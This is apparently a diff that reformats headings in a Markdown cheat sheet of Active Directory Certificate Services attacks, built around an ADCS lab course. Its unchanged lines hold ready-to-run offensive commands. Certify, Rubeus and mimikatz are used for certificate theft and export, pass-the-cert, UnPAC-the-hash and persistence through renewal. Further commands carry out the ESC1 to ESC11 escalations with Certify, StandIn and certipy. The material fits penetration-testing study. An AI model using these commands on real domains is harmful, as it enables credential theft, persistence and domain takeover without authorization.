@@ -50,9 +50,9 @@
 ------------------------------------
 
 
-## <a name="1"></a>1. General
+# <a name="1"></a>1. General
 
-#### <a name="11"></a>1.1 Enumeration
+### <a name="11"></a>1.1 Enumeration
 
 Enumerate Certificate Authorities:
 
@@ -109,7 +109,7 @@ certutil -store -enterprise Root
 ```
 
 
-#### <a name="12"></a>1.2 Request (PERSIST1)
+### <a name="12"></a>1.2 Request (PERSIST1)
 
 ```
 C:\Tools\Certify.exe find
@@ -117,7 +117,7 @@ C:\Tools\Certify.exe request /ca:CA_NAME /user:USER /domain:DOMAIN /template:TEM
 ```
 
 
-#### <a name="13"></a>Certpotato
+### <a name="13"></a>Certpotato
 
 ```
 C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER_NAME$ /rc4:HASH /ptt
@@ -125,14 +125,14 @@ C:\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|ht
 ```
 
 
-#### <a name="14"></a>UnPAC-The-Hash (THEFT5)
+### <a name="14"></a>UnPAC-The-Hash (THEFT5)
 
 ```
 C:\Tools\Rubeus.exe asktgt /getcredentials /user:COMPUTER_NAME$ /certificate:C:\Certs\COMPUTER_NAME.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /show
 ```
 
 
-#### <a name="15"></a>Conversion 
+### <a name="15"></a>Conversion 
 
 Convert .pem to .pfx certificate:
 
@@ -141,7 +141,7 @@ C:\Tools\openssl\openssl.exe pkcs12 -in C:\Certs\USER.pem -keyex -CSP "Microsoft
 ```
 
 
-#### <a name="16"></a>Export (THEFT1)
+### <a name="16"></a>Export (THEFT1)
 
 Using certutil:
 
@@ -171,7 +171,7 @@ Export-PfxCertificate -Cert Cert:\LocalMachine\My\CERTIFICATE_HASH -FilePath C:\
 ```
 
 
-#### <a name="17"></a>Export - DPAPI (THEFT2 and THEFT3)
+### <a name="17"></a>Export - DPAPI (THEFT2 and THEFT3)
 
 Export certificates from the User:
 
@@ -189,7 +189,7 @@ crypto::certificates /export /systemstore:LOCAL_MACHINE
 ```
 
 
-#### <a name="18"></a>Parse
+### <a name="18"></a>Parse
 
 Parse certificates:
 
@@ -200,7 +200,7 @@ certutil -v -dump -p "PASSWORD" C:\Certs\CERT.pfx
 ```
 
 
-#### <a name="19"></a>Install
+### <a name="19"></a>Install
 
 ```
 C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\Public\CERT.pfx /password:PASSWORD /install
@@ -209,7 +209,7 @@ C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\USER\EncryptedFiles\US
 ```
 
 
-#### <a name="110"></a>Renew (PERSIST3)
+### <a name="110"></a>Renew (PERSIST3)
 
 ```
 certreq -enroll -user -q -PolicyServer * -cert CERT_HASH renew reusekeys
@@ -217,7 +217,7 @@ certreq -enroll -user -q -cert CERT_HASH renew
 ```
 
 
-#### <a name="111"></a>Pass-The-Cert
+### <a name="111"></a>Pass-The-Cert
 
 ```
 C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /nowrap /ptt
@@ -227,9 +227,9 @@ C:\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\Certs\USER.pfx /password:P
 ----------------------------------
 
 
-## <a name="2"></a>ESCx Abuses
+# <a name="2"></a>ESCx Abuses
 
-#### <a name="21"></a>ESC1
+### <a name="21"></a>ESC1
 
 Conditions:
 
@@ -257,7 +257,7 @@ C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname
 ```
 
 
-#### <a name="22">ESC2
+### <a name="22">ESC2
 
 Conditions: 
 
@@ -285,7 +285,7 @@ C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname
 ```
 
 
-#### <a name="23">ESC3
+### <a name="23">ESC3
 
 
 Template 1: Provides Enrollment Agent Certificate
@@ -323,7 +323,7 @@ C:\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME_2 /onbehalfof:D
 ```
 
 
-#### <a name="24">ESC4
+### <a name="24">ESC4
 
 Condition: 
 
@@ -354,7 +354,7 @@ C:\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter User --ntaccount DOMAIN\U
 ```
 
 
-#### <a name="25">ESC7.1
+### <a name="25">ESC7.1
 
 Condition:
 
@@ -404,7 +404,7 @@ certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip D
 ```
 
 
-#### <a name="26">ESC8
+### <a name="26">ESC8
 
 Condition: 
 
@@ -438,7 +438,7 @@ source coercer_venv/bin/activate
 
 
 
-#### <a name="27">ESC11
+### <a name="27">ESC11
 
 Condition: 
 
@@ -467,7 +467,7 @@ source coercer_venv/bin/activate
 
 ----------------------------------
 
-## <a name="3">Sources
+# <a name="3">Sources
 
 - [Altered Security - ADCS lab](https://www.alteredsecurity.com/adcs): This is the course, highly recommended to complete the labs.
 
